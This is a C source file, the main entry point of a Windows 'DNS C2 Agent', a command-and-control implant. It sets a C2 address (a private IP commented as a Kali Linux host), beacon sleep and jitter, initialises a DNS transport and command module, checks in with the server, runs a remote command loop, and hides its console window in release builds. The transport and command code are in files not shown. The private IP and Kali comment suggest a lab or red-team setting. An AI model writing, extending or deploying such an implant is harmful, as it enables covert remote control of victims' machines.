/**
 * main.c - Entry point for DNS C2 Agent
 * 
 * Initializes the agent components and starts the command loop.
 */

 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include "include/Config.h"
 #include "include/Transport.h"
 #include "include/Command.h"
 #include "include/Utils.h"
 #include "include/Checkin.h"
 
 // Agent version
 #define AGENT_VERSION "1.0.0"
 
 // Debug mode (set to 0 for release)
 #define DEBUG_MODE 1
 
 /**
  * Print debug message if debug mode is enabled
  */
 void debug_print(const char* format, ...) {
     #if DEBUG_MODE
     va_list args;
     va_start(args, format);
     
     char buffer[1024];
     vsprintf_s(buffer, sizeof(buffer), format, args);
     
     OutputDebugStringA(buffer);
     printf("%s", buffer);
     
     va_end(args);
     #endif
 }
 
 /**
  * Initialize the agent
  */
 BOOL initialize_agent() {
     debug_print("[*] Initializing DNS C2 Agent v%s\n", AGENT_VERSION);
     
     // Initialize configuration
     debug_print("[*] Initializing configuration...\n");
     reset_config();
     
     // Set the C2 domain to the Kali Linux IP
     set_c2_domain("192.168.35.107");
     debug_print("[+] C2 domain set to: %s\n", get_c2_domain());
     
     // Set initial sleep interval (10 seconds)
     set_sleep_interval(10000);
     debug_print("[+] Sleep interval set to: %d ms\n", get_sleep_interval());
     
     // Set jitter percentage (20%)
     set_jitter_percent(20);
     debug_print("[+] Jitter percentage set to: %d%%\n", get_jitter_percent());
     
     // Initialize DNS transport
     debug_print("[*] Initializing DNS transport...\n");
     if (!dns_transport_init()) {
         debug_print("[-] Failed to initialize DNS transport\n");
         return FALSE;
     }
     debug_print("[+] DNS transport initialized\n");
     
     // Initialize command module
     debug_print("[*] Initializing command module...\n");
     if (!command_init()) {
         debug_print("[-] Failed to initialize command module\n");
         dns_transport_cleanup();
         return FALSE;
     }
     debug_print("[+] Command module initialized\n");
     
     // Check if the C2 server is reachable
     debug_print("[*] Checking C2 server connectivity...\n");
     int retries = 5;
     BOOL connected = FALSE;
     
     while (retries > 0 && !connected) {
         connected = dns_check_server(get_c2_domain());
         if (!connected) {
             debug_print("[-] C2 server not reachable, retrying in 5 seconds (%d retries left)...\n", retries);
             Sleep(5000);
             retries--;
         }
     }
     
     if (!connected) {
         debug_print("[-] C2 server not reachable after multiple attempts\n");
         debug_print("[*] Continuing anyway, will keep trying in the command loop\n");
         // We'll continue anyway and try in the command loop
     } else {
         debug_print("[+] C2 server is reachable\n");
     }
     
     return TRUE;
 }
 
 /**
  * Clean up the agent
  */
 void cleanup_agent() {
     debug_print("[*] Cleaning up agent...\n");
     
     // Clean up command module
     command_cleanup();
     
     // Clean up DNS transport
     dns_transport_cleanup();
     
     debug_print("[+] Cleanup complete\n");
 }
 
 /**
  * Main entry point
  */
 int main(int argc, char* argv[]) {
     (void)argc; // Suppress unused parameter warning
     (void)argv; // Suppress unused parameter warning
     
     // Hide console window in release mode
     #if !DEBUG_MODE
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     #endif
     
     // Initialize the agent
     if (!initialize_agent()) {
         return 1;
     }
     
     debug_print("[*] Starting agent main loop...\n");
     
     // Perform initial check-in
     BOOL checkin_success = perform_checkin();
     if (!checkin_success) {
         debug_print("[-] Initial check-in failed, will retry in command loop\n");
         // Continue anyway
     } else {
         debug_print("[+] Initial check-in successful\n");
     }
     
     // Start the command loop
     command_loop();
     
     // This point should never be reached in the current implementation
     cleanup_agent();
     
     return 0;
 }
 